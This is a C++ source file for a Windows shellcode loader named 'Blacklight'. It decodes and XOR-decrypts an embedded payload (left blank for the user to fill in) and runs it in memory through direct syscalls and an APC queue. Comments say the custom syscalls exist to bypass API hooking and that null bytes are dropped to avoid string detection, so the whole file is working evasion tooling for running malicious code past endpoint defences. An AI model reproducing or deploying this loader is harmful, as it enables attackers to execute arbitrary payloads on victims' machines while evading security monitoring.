// BLACKLIGHT.CPP
#include <Windows.h>
#include "base64.h"
#include "syscalls2.h" // CUSTOM SYSTEM CALLS TO BYPASS API HOOKING
#include <iostream>
#include <cstring>
#include <string>

using std::string;
using std::to_string;
using std::cout;
using std::endl;

// PROTOTYPES
unsigned char* decryptKey(unsigned char*, size_t);
unsigned char* decryptXOR(unsigned char*, size_t);
void run(unsigned char*, size_t);
void debug(string);
void debug(char*);
void error(string);
void error(char*);

// GLOBALS
BOOL DEBUG_MODE = false;
enum DECRYPTION_MODE {
	XOR_KEY = 1,
	BYTEWISE_XOR = 2
};

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CONFIG
///////////////////////////////////////////////////////////////////////////////////////

// TODO: PUT YOUR SC HERE
const string ENCODED_SC = "";

// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
const unsigned char BYTEWISE_XOR_KEY = 77;

// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
const unsigned char XOR_KEY_STR[] = { 'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l' };
const size_t XOR_KEY_STR_LEN = 9;

// TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
DECRYPTION_MODE DECR_MODE = XOR_KEY;

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CODE
///////////////////////////////////////////////////////////////////////////////////////

// MAIN HANDLES ARGUMENT PARSING AND INVOKING THE DECRYPTION AND ACTUAL RUN ROUTINES
int main(int argc, char** argv) {
	debug("hello, world");

	// ARGUMENTS
	// 1: TARGET PID
	// 2: DEBUG MODE

	if (argc == 2) {
		DEBUG_MODE = true;
		debug("Debug Mode activated");
	}

	// DECODE B64 INTO BYTES
	debug("decoding sc");
	string decoded_sc = base64_decode(ENCODED_SC);
	unsigned char* decoded_bytes = (unsigned char*) decoded_sc.c_str();
	size_t sc_len = decoded_sc.length();

	// DECRYPT SC BYTES
	debug("decrypting sc");
	unsigned char* sc = nullptr;
	if (DECR_MODE == XOR_KEY) {
		sc = decryptKey(decoded_bytes, sc_len);
	}
	else {
		sc = decryptXOR(decoded_bytes, sc_len);
	}
	if (!sc) {
		error("Failed to decrypt sc!");
		exit(2);
	}
	else {
		debug("Successfully decrypted sc of length " + to_string(sc_len));
		run(sc, sc_len);
	}
}

// THE ACTUAL RUNNER
void run(unsigned char* sc, size_t sc_len) {

	PVOID local_buffer = nullptr;
	HANDLE current_process = GetCurrentProcess();
	debug("Launching runner");

	// ALLOCATE MEMORY IN READWRITE MODE
	debug("Allocating virtual memory");
	NTSTATUS error_code = NtAllocateVirtualMemory(current_process, &local_buffer, 0, &sc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (error_code) {
		error("Allocating memory failed with code " + to_string(error_code));
		exit(3);
	}
	else {
		debug("Successfully allocated memory!");
	}

	// WRITE SC TO THE MEMORY
	size_t bytes_written = 0;
	NtWriteVirtualMemory(current_process, local_buffer, sc, sc_len, &bytes_written);
	if (!bytes_written || bytes_written < sc_len) {
		error("Failed to write entire sc to memory, wrote " + to_string(bytes_written) +  "/" + to_string(sc_len) + " bytes");
		exit(4);
	}
	else {
		debug("Successfully wrote sc to memory");
	}

	// REPROTECT THE MEMORY SO IT'S EXECUTABLE
	ULONG old_protect;
	error_code = NtProtectVirtualMemory(current_process, &local_buffer, &sc_len, PAGE_EXECUTE_READ, &old_protect);
	if (error_code) {
		error("Reprotecting virtual memory failed with code " + to_string(error_code));
		exit(3);
	}
	else {
		debug("Successfully reprotected virtual memory");
	}

	// CREATE AN APC ROUTINE
	error_code = NtQueueApcThread(GetCurrentThread(), (PKNORMAL_ROUTINE)local_buffer, NULL, NULL, NULL);
	if (error_code) {
		error("Creating APC routine failed with code " + to_string(error_code));
		exit(3);
	}
	else {
		debug("Successfully created APC routine!");
	}

	// RUN IT
	error_code = NtTestAlert();
	if (error_code) {
		error("Flushing APC Queue failed with code " + to_string(error_code));
		exit(3);
	}
	else {
		debug("Successfully flushed APC Queue!");
	}
}

/////////////////////////////////////////////////////////////////////////////
// DECRYPTION ROUTINES
/////////////////////////////////////////////////////////////////////////////

//  DECRYPTION METHOD WITH XOR KEY
unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {

	debug("Decrypting with key");

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	// i IS THE INDEX IN THE SC
	// j IS THE INDEX IN THE KEY
	size_t j = 0;
	for (size_t i = 0; i < length; i++) {

		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
		if (j == XOR_KEY_STR_LEN){
			j = 0;
		}
		decrData[i] = encryptedBytes[i] ^ XOR_KEY_STR[j];
		j++;
	}
	decrData[length] = '\x00';
	return decrData;
}

// DECRYPT WITH BYTEWISE XOR, NOT RECOMMENDED
unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {

	debug("decrypting with bytewise xor");

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	for (size_t i = 0; i < length; i++) {
		decrData[i] = encryptedBytes[i] ^ BYTEWISE_XOR_KEY;
	}
	decrData[length] = '\x00';
	if (DEBUG_MODE) cout << "finished decryption" << endl;
	return decrData;
}

/////////////////////////////////////////////////////////////////////////////
// DEBUGGING WRAPPERS
/////////////////////////////////////////////////////////////////////////////

void debug(string msg) {
	if (DEBUG_MODE) cout << "[+] " << msg << endl;
}
void debug(char* msg) {
	if (DEBUG_MODE) cout << "[+] " << msg << endl;
}

void error(string msg) {
	if (DEBUG_MODE) cout << "[!] " << msg << endl;
}
void error(char* msg) {
	if (DEBUG_MODE) cout << "[!] " << msg << endl;
}